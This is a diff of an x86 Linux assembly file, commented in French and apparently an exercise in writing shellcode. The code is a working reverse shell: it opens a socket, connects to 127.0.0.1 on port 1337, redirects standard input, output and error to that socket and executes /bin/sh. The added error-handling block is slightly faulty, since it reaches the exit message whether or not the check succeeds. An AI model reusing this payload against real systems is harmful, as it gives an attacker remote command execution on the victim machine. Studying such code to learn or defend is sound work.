@@ -1,97 +1,111 @@
 global _start			
 
+
 section .text
 _start:
 
+		; Création du socket
 
-	    	  ;
-		  ; Création du socket
-		  ;
+	        ; Utilisation de la commande socket() avec comme arguments(2,1,0)
 
-		  ; Utilisation de la commande socket(2,1,0)
+		        ; Création des arguments pour socket() 
+	add eax, 0x66	; Création de 102 en hexadécimal dans eax car la fonction d'appel du socket est 102
+	add ebx, 0x1    ; Création de 1 dans ebx, on en aura besoin en tant qu'argument après
+	xor edx,edx     ; Mise en place de la valeur d'edx à 0, on en aura besoin en tant qu'argument après
+	push edx        ; Argument 3, Protocole TCP (0)
+	push ebx        ; Argument 2, Connexion TCP (1)
+	push 0x2        ; Argument 1, IPv4 (2)
 
-
-		
-	push 0x66 ; Création de 102 en hexadécimal sur la stack car la fonction d'appel du socket est 102
-	pop eax   ; Récupération de la dernière valeur de la stack, eax = 0x66
-
-	push 0x1  ; Création de 1 sur la stack car on en aura besoin en tant qu'argument après
-	pop ebx   ; Récupération de la dernière valeur de la stack, ebx = 0x1
-
-	xor edx,edx   ; Mise en place de la valeur d'edx, edx = 0
-
-	push edx  ; Mettre edx sur la stack, on a besoin de l'argument 0 en troisième position dans la stack (0 = Laisser le fournisseur d'accès pour donner le procotole qui sera TCP)
-	push ebx  ; Mettre ebx sur la stack, on a besoin de l'argument 1 en second dans la stack (Connexion TCP)
-	push 0x2  ; Mettre 0x2 sur le stack, on a besoin de l'argument 2 en première position (IPv4)
-		
-	mov ecx, esp  ; ? Pointe ecx en haut de la stack ? 
-	int 0x80  ; Execution de la commande socket
-
-	xchg edx, eax ; Sauvegarde du fichier pour s'en servir plus tard
+	mov ecx, esp 
+	int 0x80      ; Execution de la commande socket(2,1,0)
+	xchg edx, eax ; Sauvegarde du fichier socket dans socketfd pour s'en servir plus tard
 
 
 
-		  ;
-		  ; Connexion à l'adresse IP et au port de la machine
-		  ;
+		;
+		; Connexion à l'adresse IP et au port de la machine
+		;
 
-		  ; Utilisation de la commande sockaddr_in(2,1337 ,127.1.1.1)
-		  ; Utilisation de la commande connect(sockfd ,sockaddr_in ,16) pour se connecter à distance
-		  ; sockfd      -> Fichier où est la configuration du socket
-		  ; sockaddr_in -> Répertorie les inforations nécessaire afin de se connecter à distance au poste voulu
+		; Utilisation de la commande sockaddr_in() avec comme arguments (2,1337,127.0.0.1) afin de récupérer les informations de connexion
+		; Utilisation de la commande connect() avec comme arguments (sockfd,sockaddr_in,16) pour se connecter à distance
 
+	
+			 ; Création des arguments pour sockaddr_in()
+	mov al, 0x66 
+	push 0x0100007f  ; Argument 3, Adresse IP cible (127.0.0.1)
+	push word 0x3905 ; Argument 2, Port cible (1337)
+	inc ebx          ; Augmente le répertoire de ebx de 1 pour l'argument 3
+	push word bx     ; Argument 1, IPv4(2)
+	mov ecx, esp
 
-	mov al, 0x66 ; On remet la valeur 102 en hexadécimal à eax, eax = 102
+		  ; Création des arguments pour connect()
+	push 0x10 ; Argument 3, taille de l'adresse (16)
+	push ecx  ; Argument 2, le fichier sockaddr_in
+	push edx  ; Argument 1, le fichier sockfd
 
-	push 0x0101017f  ; L'adresse IP cible (127.1.1.1), troisième argument de la commande sockaddr_in
-	push word 0x3905 ; Le port cible (1337), deuxième argument de la commande sockaddr_in
-	inc ebx          ; Augmente le répertoire de ebx de 1, ebx = 1 + 1 = 2
-	push word bx     ; Mettre sur la stack l'argument 0x2, premier argument de la commande sockaddr_in
-	mov ecx, esp     ; ?
+	mov ecx, esp
 
-	push 0x10 ; Argument 3 de la commande connect(), taille de l'adresse 
-	push ecx  ; Argument 2 de la commabde connect(), pointe vers le ?fichier? sockaddr
-	push edx  ; Argument 1 de la commande connect(), le fichier sockfd
-
-	mov ecx, esp ; ?
-
-	inc ebx ; Augmente le répertoire de ebx de 1, ebx = 2 + 1 = 3 (3 est l'appel système de la commande connect())
+	inc ebx  ; Augmente le répertoire de ebx de 1, ebx = 2 + 1 = 3 (3 est l'appel système de la commande connect())
 	int 0x80 ; Execution de la commande connect()
+
+
+
+
+
 
 	;
 	; Redirection du stdin, stdout et stderr avec dup2
 	;
+	
+		 ; Utilisation de la commande dup2() avec comme arguments (0,1,2)
 
-	; int dup2(int oldfd, int newfd);
 
+	push 0x2     ; Mise en place de 2 pour la boucle
+	pop ecx      ; Création du compteur pour la boucle
+	xchg ebx,edx ; Sauvegarde du fichier de socket
 
-
-	;Utilisation de la commande dup2()
-	push 0x2 ; Mettre le chiffre 2 en haut de la stack
-	pop ecx  ; Création du compteur pour la boucle
-
-	xchg ebx,edx ; Sauvegarde du fichier de socket 
-
-	; Boucle trois fois pour appeler stdin(0), stdout(1) et stderr(2)
+	             ; Création des arguments pour dup2 
+	             ; Boucle trois fois pour appeler stdin(0), stdout(1) et stderr(2)
 loop:
 	mov al, 0x3f ; Appel système de la commande dup2()
 	int 0x80     ; Execution de la commande dup2()
 	dec ecx	     ; Décrémentation de la boucle jusqu'à 0
-	jns loop     ; Tant que SF n'est pas mis lire la boucle
+	jns loop     ; Tant que non nul on relance la boucle
 
+		     ; Utilisation de la commande execve(chemin,0,0) avec comme arguments (/bin/sh,0,0)
 
-	; Utilisation de la commande execve(chemin,0,0)
 	mov al, 0x0b ; Appel système de la commande execve()
 
-	inc ecx      ; Argument argv à 0
-	mov edx,ecx  ; Argument envp à 0
+		        ; Création des arguments pour execve()
+	inc ecx         ; Argument 1, argv à 0
+	mov edx,ecx     ; Argument 2, envp à 0
+	push edx        ; Argument 3, 0 en haut de la stack pour terminé le chemin en NULL
+	push 0x68732f2f	; Argument 3, Mettre "hs//" en haut de la stack qui est une partie du chemin
+	push 0x6e69622f	; Argument 3, Mettre "nib/" en haut de la stack qui est une partie du chemin
 
-	push edx        ; Mettre 0 en haut de la stack pour terminé le chemin en NULL
-	push 0x68732f2f	; Mettre "hs//" en haut de la stack qui est une partie du chemin
-	push 0x6e69622f	; Mettre "nib/" en haut de la stack qui est une partie du chemin
-
-	mov ebx, esp ; ?
-	int 0x80 ; Execution de la commande execve
+	mov ebx, esp
+	int 0x80 ; Execution de la commande execve()
 
 
+	;
+	; Gestion d'erreur
+	;
 
+	cmp eax, 0 ; Comparaison  d'eax avec 0
+	jl leave   ; Si eax < 0 on jump à la fonction leave
+
+leave: ; Fonction leave
+
+	
+	mov eax, 4   ; Appel système de stdout
+	mov ebx, 1   ; Appel système d'exit
+	mov ecx, msg ; Copie du message dans ecx 
+	mov edx, len ; Copie de la taille dans edx
+	int 0x80
+
+	mov eax, 1
+	int 0x80
+
+section .data
+	msg db "Le port n'est pas en écoute", 0xD, 0xA
+	len equ $ - msg
